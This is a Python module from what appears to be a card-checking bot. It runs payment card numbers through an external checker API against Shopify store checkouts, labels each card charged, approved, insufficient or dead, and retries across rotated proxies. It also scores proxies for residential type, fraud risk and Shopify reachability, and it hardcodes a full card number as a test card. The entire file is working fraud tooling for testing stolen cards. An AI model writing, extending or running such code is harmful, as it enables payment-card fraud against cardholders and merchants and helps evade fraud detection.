import asyncio
import random
import time

import aiohttp

from config import CHECKER_API_URL
from utils.helpers import is_dead_site_error, is_site_dead, get_price_from_response


# ─── Card Checking ────────────────────────────────────────────────────────────

async def check_card(card: str, site: str, proxy: str) -> dict:
    """Check a single card against a site using the checker API.

    Returns a result dict with keys:
        status   : 'Charged' | 'Approved' | 'Dead' | 'Site Error' | 'Invalid Format'
        message  : raw API response string
        card     : the card string that was checked
        site     : the site used (when available)
        gateway  : gateway name from API
        price    : price from API
        price_value : float price value
        retry    : True if caller should retry with a different site
    """
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return {
                "status": "Invalid Format",
                "message": "Invalid card format",
                "card": card,
            }

        if not site.startswith('http'):
            site = f'https://{site}'

        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy

        param_name = "site" if "shopify_parallel" in CHECKER_API_URL else "url"
        url = f'{CHECKER_API_URL}?{param_name}={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'

        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {
                        "status": "Site Error",
                        "message": f"HTTP {resp.status}",
                        "card": card,
                        "retry": True,
                    }
                try:
                    raw = await resp.json(content_type=None)
                except Exception:
                    text = await resp.text()
                    return {
                        "status": "Site Error",
                        "message": f"Invalid JSON: {text[:100]}",
                        "card": card,
                        "retry": True,
                    }

        response_msg = raw.get("Response", "")
        price = raw.get("Price", "-")
        price_value = get_price_from_response(raw)
        if price != '-' and price != 0:
            price_display = f"${price}"
        else:
            price_display = '-'
        gateway = raw.get("Gateway", "Shopify")

        # Use the full is_site_dead check (gateway + price + keywords)
        if is_site_dead(response_msg, gateway, price_display):
            return {
                "status": "Site Error",
                "message": response_msg,
                "card": card,
                "retry": True,
                "gateway": gateway,
                "price": price_display,
                "price_value": price_value,
            }

        response_lower = response_msg.lower()
        api_status = raw.get("Status", raw.get("status", ""))
        api_status_str = str(api_status).strip().lower() if api_status is not None else ""

        # Charged detection
        if (
            api_status_str == "charged" or
            any(k in response_lower for k in (
                'charged', 'order_placed', 'order completed', 'thank you', 'payment successful',
            )) or
            '💎' in response_msg
        ):
            return {
                "status": "Charged",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gateway,
                "price": price_display,
                "price_value": price_value,
            }

        # Insufficient Funds detection
        _insuff_keywords = ('insufficient_funds', 'insufficient funds', 'insufficient')
        if (
            api_status_str in ("insufficient", "insuff") or
            any(k in response_lower for k in _insuff_keywords)
        ):
            return {
                "status": "Insuff",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gateway,
                "price": price_display,
                "price_value": price_value,
            }

        # Approved detection (includes CVV issues, 3DS, etc.)
        _approved_keywords = (
            'approved', 'success',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip',
            'cvv issue', '3d', '3d secure', 'otp',
            'verification required', 'authenticate',
            'authentication required', 'challenge required',
            'redirecting to bank', 'bank verification',
            'send code', 'enter code', 'verify',
        )

        if (
            api_status_str == "approved" or
            any(k in response_lower for k in _approved_keywords)
        ):
            return {
                "status": "Approved",
                "message": response_msg,
                "card": card,
                "site": site,
                "gateway": gateway,
                "price": price_display,
                "price_value": price_value,
            }

        # Everything else is Dead (declined)
        return {
            "status": "Dead",
            "message": response_msg,
            "card": card,
            "site": site,
            "gateway": gateway,
            "price": price_display,
            "price_value": price_value,
        }

    except asyncio.TimeoutError:
        return {
            "status": "Site Error",
            "message": "Request timeout",
            "card": card,
            "retry": True,
        }

    except Exception as exc:
        return {
            "status": "Dead",
            "message": str(exc),
            "card": card,
            "gateway": "Unknown",
            "price": "-",
            "price_value": 0,
        }


async def check_card_with_retry(
    card: str,
    sites: list,
    proxies: list,
    max_retries: int = 20,
) -> dict:
    """Attempt to check a card, retrying with different site/proxy on site errors.

    Args:
        card        : card string in ``number|mm|yyyy|cvv`` format
        sites       : list of site URLs to randomly choose from
        proxies     : list of proxy strings to randomly choose from
        max_retries : maximum number of site attempts before giving up

    Returns a result dict (see :func:`check_card`).
    """
    if not sites:
        return {
            "status": "Dead",
            "message": "No sites available",
            "card": card,
            "gateway": "Unknown",
            "price": "-",
            "price_value": 0,
        }

    if not proxies:
        return {
            "status": "Dead",
            "message": "No proxies available",
            "card": card,
            "gateway": "Unknown",
            "price": "-",
            "price_value": 0,
        }

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get("retry"):
            return result

        if attempt < max_retries - 1:
            await asyncio.sleep(2)

    return {
        "status": "Dead",
        "message": "Max retries exceeded",
        "card": card,
        "gateway": "Unknown",
        "price": "-",
        "price_value": 0,
    }


# ─── Site / Proxy Testing ─────────────────────────────────────────────────────

_TEST_CARD = "4031630422575208|01|2030|280"


async def test_site(site: str, proxy: str) -> dict:
    """Test whether a site is alive by running a dummy card through the API."""
    try:
        if not site.startswith('http'):
            site = f'https://{site}'

        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"

        param_name = "site" if "shopify_parallel" in CHECKER_API_URL else "url"
        url = f'{CHECKER_API_URL}?{param_name}={site}&cc={_TEST_CARD}'
        if proxy_str:
            url += f'&proxy={proxy_str}'

        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead', 'price': 0.0, 'msg': f'HTTP {resp.status}'}
                try:
                    raw = await resp.json(content_type=None)
                except Exception:
                    return {'site': site, 'status': 'dead', 'price': 0.0, 'msg': 'Invalid JSON'}

        response_msg = raw.get('Response', '')
        gateway = raw.get('Gateway', '')
        price_display = raw.get('Price', '-')
        price_value = get_price_from_response(raw)

        if is_site_dead(response_msg, gateway, price_display):
            return {'site': site, 'status': 'dead', 'price': 0.0, 'msg': response_msg or 'Site dead'}
        else:
            return {'site': site, 'status': 'alive', 'price': price_value, 'msg': response_msg}

    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': 0.0, 'msg': str(e)}


def get_proxy_url(proxy_str: str) -> str:
    proxy_str = proxy_str.strip()
    try:
        if "@" in proxy_str:
            auth, hostport = proxy_str.rsplit("@", 1)
            user, password = auth.split(":", 1)
            host, port = hostport.rsplit(":", 1)
            return f"http://{user}:{password}@{host}:{port}"
        else:
            parts = proxy_str.split(":")
            if len(parts) == 4:
                host, port, user, password = parts
                return f"http://{user}:{password}@{host}:{port}"
            elif len(parts) == 2:
                return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None

async def test_proxy(proxy_str: str, timeout: int = 10) -> dict:
    """Full proxy test — IP, country, speed, type, fraud score, and Shopify connectivity"""
    result = {
        "proxy": proxy_str, "status": "dead", "alive": False, "ms": None, "ip": None,
        "country": None, "country_code": None, "isp": None, "type": None,
        "shopify": False, "shopify_ms": None,
        "fraud_score": None, "is_proxy": None, "is_vpn": None,
        "error": None,
    }
    proxy_url = get_proxy_url(proxy_str)
    if not proxy_url:
        result["error"] = "Invalid format"
        return result
    
    # Detect proxy type from URL
    if proxy_url.startswith("socks5"):
        result["type"] = "SOCKS5"
    elif proxy_url.startswith("socks4"):
        result["type"] = "SOCKS4"
    else:
        result["type"] = "HTTP"
    
    try:
        # Step 1: Basic connectivity + IP info
        t0 = time.perf_counter()
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as s:
            async with s.get("http://ip-api.com/json?fields=query,country,countryCode,isp,org,as,hosting", proxy=proxy_url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["alive"] = True
                    result["status"] = "alive"
                    result["ms"] = round((time.perf_counter() - t0) * 1000)
                    result["ip"] = data.get("query", "?")
                    result["country"] = data.get("country", "?")
                    result["country_code"] = data.get("countryCode", "?")
                    result["isp"] = data.get("isp") or data.get("org") or "?"
                    if data.get("hosting"):
                        result["type"] += " (DC)"
                    else:
                        result["type"] += " (Resi)"
                else:
                    result["error"] = f"HTTP {resp.status}"
                    return result
    except asyncio.TimeoutError:
        result["error"] = "Timeout"
        return result
    except Exception as e:
        result["error"] = str(e)[:40]
        return result
    
    # Step 2: Fraud score check via proxycheck.io (free, no key)
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=6)) as s:
            check_url = f"http://proxycheck.io/v2/{result['ip']}?vpn=1&risk=1&asn=1"
            async with s.get(check_url) as resp:
                if resp.status == 200:
                    fdata = await resp.json()
                    ip_data = fdata.get(result["ip"], {})
                    result["fraud_score"] = ip_data.get("risk", None)
                    result["is_proxy"] = ip_data.get("proxy", "?")
                    result["is_vpn"] = ip_data.get("vpn", "?")
    except Exception:
        pass  # Non-critical, continue without fraud score
    
    # Step 3: Shopify connectivity test
    try:
        t1 = time.perf_counter()
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=8),
            connector=aiohttp.TCPConnector(ssl=False)
        ) as s:
            async with s.get(
                "https://checkout.shopify.com",
                proxy=proxy_url
            ) as resp:
                result["shopify_ms"] = round((time.perf_counter() - t1) * 1000)
                if resp.status in (200, 301, 302, 403, 404):
                    result["shopify"] = True
    except Exception:
        result["shopify"] = False
        result["shopify_ms"] = None
    
    return result
